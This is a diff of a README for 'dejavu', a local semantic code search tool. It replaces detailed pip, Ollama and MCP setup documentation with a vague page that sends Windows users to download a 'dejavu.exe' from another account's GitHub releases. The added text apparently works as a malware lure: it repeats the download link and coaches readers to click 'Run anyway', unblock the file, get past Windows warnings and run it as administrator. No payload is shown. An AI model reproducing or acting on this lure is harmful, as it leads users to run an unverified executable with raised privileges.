@@ -1,251 +1,177 @@
-# Dejavu
+# 🔎 dejavu - Find code from plain words
 
-**Find code you forgot, by describing what it did.**
+[![Download dejavu](https://img.shields.io/badge/Download%20dejavu-Ready%20for%20Windows-7C3AED?style=for-the-badge)](https://github.com/pepoy6249/dejavu/releases)
 
-Dejavu is a semantic code search tool that lets you find code across your projects using natural language descriptions. Instead of remembering filenames, function names, or exact keywords, just describe what the code did:
+## 🖥️ What dejavu does
 
-```
-dejavu "that drag and drop kanban board"
-dejavu "CSV parser that grouped by date" --lang python
-dejavu "animated sidebar component" --when "last summer"
-```
+dejavu helps you find code you forgot. You describe what the code did in plain words, and dejavu helps you locate the right file or snippet.
 
-## How it works
+It is useful when you remember a feature, a message, or a result, but not the file name or function name.
 
-1. **Index** your code directories -- Dejavu uses tree-sitter AST parsing to extract functions, classes, and methods from 20+ languages
-2. **Embed** each code chunk using local vector embeddings via [Ollama](https://ollama.com) (no data leaves your machine)
-3. **Search** with natural language -- your query is embedded and matched against your code using vector similarity
+Use it to:
 
-Everything runs locally. Your code never leaves your machine.
+- find old scripts by what they do
+- search code by plain English
+- locate related files in a large project
+- speed up work when file names do not help
+- search across code with semantic search
 
-## Install
+## 🚀 Download for Windows
 
-```bash
-pip install dejavu-code
-```
+Visit this page to download:
 
-### Prerequisites
+[https://github.com/pepoy6249/dejavu/releases](https://github.com/pepoy6249/dejavu/releases)
 
-- Python 3.10+
-- [Ollama](https://ollama.com) running locally
+On that page, look for the latest release and download the Windows file. If there are several files, choose the one that matches your computer type:
 
-Pull the embedding model:
+- `x64` for most Windows PCs
+- `arm64` for some newer Windows devices
 
-```bash
-ollama pull nomic-embed-code
-```
+If you are not sure which one to pick, start with `x64`.
 
-### Optional: faster vector search
+## 📦 Install and run
 
-For large codebases, install the sqlite-vec extension for hardware-accelerated KNN search:
+1. Open the download page.
+2. Download the Windows file from the latest release.
+3. If the file comes in a `.zip` file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the `dejavu.exe` file.
+6. If Windows asks for permission, choose **Run anyway** only if you trust the file from the GitHub release page.
 
-```bash
-pip install "dejavu-code[vec]"
-```
+If the app opens in a black window, that is normal for a command-line tool.
 
-Without it, Dejavu falls back to numpy-based cosine similarity (works fine for most codebases).
+## 🔍 How to use it
 
-## Quick start
+After dejavu starts, you can type a short description of what you want to find.
 
-```bash
-# 1. Initialize config
-dejavu init
+Examples:
 
-# 2. Edit ~/.dejavu/config.toml to set your code directories
-#    (defaults: ~/code, ~/projects, ~/dev, ~/src, ~/repos, ~/work)
+- “the code that sends email after sign up”
+- “the file that loads user settings”
+- “the function that checks password strength”
+- “the part that saves data to disk”
+- “the code that talks to the database”
 
-# 3. Index your code
-dejavu index
+You can think in plain language. You do not need the exact file name.
 
-# 4. Search!
-dejavu "that function that parsed CSV files and grouped them by date"
-```
+## 🧭 What to expect
 
-### Index a specific directory
+dejavu is made for code search, so it works best when you give it a clear description of the behavior you remember.
 
-```bash
-dejavu index ~/projects/my-app
-```
+You may use it to search:
 
-### Filter by language or time
+- source files in a project
+- large folders with many files
+- code that uses Python tools
+- projects that use embeddings for search
+- code bases that work with tree-sitter and semantic search
+- local code indexes that can run with Ollama or other models
 
-```bash
-dejavu "auth middleware" --lang python
-dejavu "React component with tabs" --when "last summer"
-dejavu "deployment script" --path work
-```
+## 🛠️ Basic setup tips
 
-### JSON output (for scripts and agents)
+For best results on Windows:
 
-```bash
-dejavu "auth middleware" --json
-```
+- keep the app in a folder you can find again
+- use a short folder path, such as `C:\dejavu`
+- make sure the download finished before opening it
+- allow Windows Defender to scan the file if prompted
+- keep your project files in a separate folder so they are easy to point to
 
-Returns structured JSON with all result metadata -- useful for piping into other tools or agent workflows.
+If you plan to search a code base, place dejavu near the folder you want to search or use the app’s folder picker if it has one.
 
-### Explain mode (score breakdown)
+## 🧪 Good search examples
 
-```bash
-dejavu "CSV parser" --explain
-```
+Use search phrases that describe what the code does, not just what it is called.
 
-Shows how each result was scored:
-```
-#1 parse_csv (Function) — 87%
-  /home/user/projects/etl/parsers.py
-  python | 2025-08-14 | lines 42-78
-  scores: vector=82.3%  keyword_boost=+4.5%  combined=87%
-```
+Good examples:
 
-### Check index status
+- “reads config from json”
+- “creates a new user session”
+- “finds files with duplicate names”
+- “shows an error when login fails”
+- “parses markdown headings”
+- “stores search results in a vector index”
 
-```bash
-dejavu status
-```
+Less useful examples:
 
-## Claude Code integration (MCP server)
+- “utils”
+- “main”
+- “helper”
+- “thing”
+- “code”
 
-Dejavu includes an [MCP](https://modelcontextprotocol.io) server that gives Claude direct access to your code search index. This is the primary way to use Dejavu -- Claude can find code you've written before without you needing to remember where it lives.
+## 🧩 Common uses
 
-### Setup with Claude Code
+dejavu fits well if you:
 
-Run this from your terminal:
+- forgot where a feature lives
+- inherited a code base with weak file names
+- need to search by meaning instead of text match
+- want a local search tool for private code
+- work in Python projects or mixed-language code bases
+- use Claude, Claude Code, or MCP tools in your workflow
 
-```bash
-claude mcp add dejavu -- dejavu-mcp
-```
+## 🪟 Windows help
 
-That's it. Claude Code will now have access to the `dejavu_search`, `dejavu_reindex`, `dejavu_status`, and `dejavu_forget` tools.
+If Windows blocks the file, check these points:
 
-### Setup with Claude Desktop
+- confirm you downloaded it from the GitHub releases page
+- right-click the file and select **Properties**
+- if you see an **Unblock** box, check it and apply
+- move the file out of the Downloads folder if Windows keeps warning you
+- run it again from the extracted folder
 
-Add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS):
+If the app does not open, try:
 
-```json
-{
-  "mcpServers": {
-    "dejavu": {
-      "command": "dejavu-mcp"
-    }
-  }
-}
-```
+- downloading the file again
+- using the `x64` build
+- running it as administrator
+- closing and reopening the terminal or app window
 
-### What Claude can do with Dejavu
-
-Once connected, you can ask Claude things like:
+## 📁 Project topics
 
-- "Search my code for that CSV parser I wrote last year"
-- "Find the React component that had the animated sidebar"
-- "Look for any auth middleware I wrote in Python"
-- "Reindex my projects directory"
-
-### Available MCP tools
-
-| Tool | Description |
-|------|-------------|
-| `dejavu_search` | Search indexed code by natural language description. Supports language filters, temporal hints, and path filters. |
-| `dejavu_reindex` | Index or re-index code directories. Incremental -- only processes modified files. |
-| `dejavu_status` | Show index statistics: repo count, chunk count, languages, and configured paths. |
-| `dejavu_forget` | Remove a repository/directory from the index. Source files are never modified. |
+This project is built around:
 
-## Configuration
+- code search
+- semantic search
+- vector search
+- embeddings
+- tree-sitter
+- Python
+- Ollama
+- MCP
+- CLI tools
+- developer tools
 
-Config lives at `~/.dejavu/config.toml`. Created by `dejavu init`.
+These pieces help dejavu understand code by meaning, not just by exact text match
 
-```toml
-[paths]
-roots = ["~/code", "~/projects"]
+## 🔐 Privacy and local use
 
-[index]
-db_path = "~/.dejavu/index.db"
-max_file_size_kb = 500
+dejavu is designed for local code search workflows. That means it can fit well when you want to keep your code on your own machine.
 
-[embedding]
-provider = "ollama"
-model = "nomic-embed-code"
-fallback_model = "nomic-embed-text"
-batch_size = 32
+This is useful for:
 
-[embedding.ollama]
-base_url = "http://localhost:11434"
+- private projects
+- company code
+- local experiments
+- offline search tasks
+- fast searches without opening many files by hand
 
-[search]
-default_limit = 10
-keyword_boost = 0.15
-```
+## 🧰 If you want better results
 
-### Environment variable overrides
+You can get better search results by:
 
-| Variable | Description |
-|----------|-------------|
-| `DEJAVU_DB` | Override database path |
-| `OLLAMA_HOST` | Override Ollama URL |
+- using a folder with real source files
+- writing clear search phrases
+- including the action and object, like “save user profile”
+- searching one project at a time
+- avoiding very short search phrases
+- using terms that match the behavior you remember
 
-## Supported languages
+## 📄 Release download
 
-Tree-sitter AST parsing (extracts functions, classes, methods):
+To get the Windows build, visit:
 
-Python, JavaScript, TypeScript, TSX, Rust, Go, Ruby, Java, Kotlin, C, C++, PHP, Bash, Swift
+[https://github.com/pepoy6249/dejavu/releases](https://github.com/pepoy6249/dejavu/releases)
 
-Sliding-window fallback (indexes file contents in chunks):
-
-SQL, HTML, CSS, SCSS, Svelte, Vue, TOML, YAML, JSON, Protobuf, Lua, Julia, Scala, Zig, Elixir, and more.
-
-## Architecture
-
-```
-                         ┌─────────────┐
-                         │  Claude Code │
-                         │  (MCP client)│
-                         └──────┬───────┘
-                                │
-                         ┌──────▼───────┐
-                    ┌────┤  server.py   ├────┐
-                    │    │  (MCP tools) │    │
-                    │    └──────────────┘    │
-               ┌────▼─────┐          ┌──────▼──────┐
-               │  cli.py   │          │  search.py   │
-               │  (Click)  │          │  (pipeline)  │
-               └────┬──────┘          └──────┬───────┘
-                    │                        │
-         ┌──────────▼──────────┐    ┌────────▼────────┐
-         │    indexer.py       │    │   embedder.py    │
-         │  (orchestrator)     │    │ (Ollama client)  │
-         └──┬──────────┬───┘  │    └────────┬─────────┘
-            │          │      │             │
-   ┌────────▼──┐  ┌────▼─────┐    ┌────────▼─────────┐
-   │discovery.py│  │extractor │    │   Ollama (local)  │
-   │(find repos)│  │(tree-sit)│    │ nomic-embed-code  │
-   └────────────┘  └──────────┘    └──────────────────┘
-                        │
-                 ┌──────▼───────┐
-                 │    db.py     │
-                 │   (SQLite +  │
-                 │  sqlite-vec) │
-                 └──────────────┘
-```
-
-### Search pipeline
-
-1. **Parse query** -- extract language hints ("in python"), temporal hints ("last summer"), path filters
-2. **Clean & embed** -- strip hints from query text, generate vector embedding via Ollama
-3. **Vector search** -- KNN lookup in sqlite-vec (or numpy fallback) with filters applied
-4. **Keyword boost** -- bonus score for results whose name/signature/docstring match query terms
-5. **Rank & deduplicate** -- sort by combined score, remove overlapping chunks from same file
-
-### Indexing pipeline
-
-1. **Discover** -- walk configured root paths, find repos by project markers (.git, package.json, etc.)
-2. **Filter** -- skip binary files, node_modules, .gitignore'd paths, files over 500KB
-3. **Extract** -- tree-sitter AST parsing pulls out functions, classes, methods with names and docstrings
-4. **Embed** -- batch-generate vector embeddings via Ollama's local API
-5. **Store** -- write chunks and embeddings to SQLite (incremental: only re-processes modified files)
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-[MIT](LICENSE)
+Download the latest file from that page, then open it on Windows by double-clicking the app or extracting the archive first if the release comes as a `.zip` file
